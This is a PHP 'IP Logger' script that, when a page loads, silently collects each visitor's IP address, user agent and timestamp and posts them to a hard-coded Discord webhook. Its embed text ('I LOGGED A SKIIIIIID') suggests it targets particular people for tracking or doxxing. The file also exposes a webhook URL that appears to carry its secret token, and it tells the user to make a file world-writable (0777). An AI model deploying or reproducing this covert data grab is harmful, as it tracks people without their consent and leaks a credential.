<?php
// Do make a visitors.html file and set permission to 0777
 
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$dateTime = date('Y/m/d G:i:s');
$webhookurl = "https://discord.com/api/webhooks/846299739875049482/5vXHGEMPRw-YN7uBAuBbXfBpEUKIAnogtqtQni7gYDYf9HW8NQ1Kex0DkGe0A4gwOywl";

//=======================================================================================================
// Compose message. You can use Markdown
// Message Formatting -- https://discordapp.com/developers/docs/reference#message-formatting
//========================================================================================================

$timestamp = date("c", strtotime("now"));

$json_data = json_encode([
    // Message
    "content" => "",
    
    // Username
    "username" => "IP Logger",

    // Avatar URL.
    // Uncoment to replace image set in webhook
    //"avatar_url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=512",

    // Text-to-speech
    "tts" => false,

    // File upload
    // "file" => "",

    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "IP Logger",

            // Embed Type
            "type" => "rich",

            // Embed Description
            "description" => "I LOGGED A SKIIIIIID",

            // URL of title link
            "url" => "",

            // Timestamp of embed must be formatted as ISO8601

            // Embed left border color in HEX
            "color" => hexdec( "3366ff" ),
            // Author
            "author" => [
                "name" => "Xffect",
                "url" => "https://sexy.com/"
            ],

            // Additional Fields array
            "fields" => [
                // Field 1
                [
                    "name" => "IP",
                    "value" => "$ip",
                    "inline" => false
                ],
                // Field 2
                [
                    "name" => "User Agent",
                    "value" => "$browser",
                    "inline" => false
                ],
                [
                    "name" => "Time",
                    "value" => "$dateTime",
                    "inline" => false
                ]

                // Etc..
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
// echo $response;
curl_close( $ch );
?>